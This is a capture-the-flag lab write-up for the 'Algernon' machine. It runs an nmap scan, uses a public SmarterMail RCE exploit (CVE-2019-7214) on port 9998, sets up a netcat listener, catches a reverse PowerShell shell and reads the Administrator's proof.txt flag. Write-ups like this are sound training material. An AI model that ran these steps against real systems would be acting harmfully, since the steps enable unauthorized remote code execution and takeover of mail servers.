# Algernon

This lab have a vulnerability to Remote Code Execution (RCE) on port 9998 which is a smarter mail.

# nmap
```bash
┌──(michal161㉿kali)-[~]
└─$ nmap 192.168.137.65 --open -sCV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 14:59 CDT
Nmap scan report for 192.168.137.65
Host is up (0.040s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 10-13-25  12:38PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_10-13-25  12:38PM       <DIR>          Spool
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Mon, 13 Oct 2025 19:59:44 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-13T19:59:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.51 seconds

```

# exploitation
With nmap we could see there is a port which is smartmail on port 9998 and we found an rce from exploit-db (https://www.exploit-db.com/exploits/49216) after we change HOST and LHOST value we can proceed but before this we need to open a new shell with listener.

```bash
┌──(michal161㉿kali)-[~]
└─$ nc -lvnp 4444                  
listening on [any] 4444 ...
```

after this go back to first shell and execute the exploit.

```bash
┌──(michal161㉿kali)-[~/pgp/Algernon]
└─$ python cve-2019-7214.py

```

After we execute the command we should get a reverse shell.

```Powershell
connect to [192.168.45.192] from (UNKNOWN) [192.168.215.65] 49972

PS C:\Windows\system32>
```

After going to the path with flag we can read the flag with command below.

```Powershell
PS C:\Users\Administrator\desktop> dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/29/2020   9:29 PM           1450 Microsoft Edge.lnk                                                    
-a----       10/16/2025   8:52 AM             34 proof.txt                                                             


PS C:\Users\Administrator\desktop> type proof.txt
beadf9faccc73225cb5dd8a3c76d0bf9
PS C:\Users\Administrator\desktop> 

```
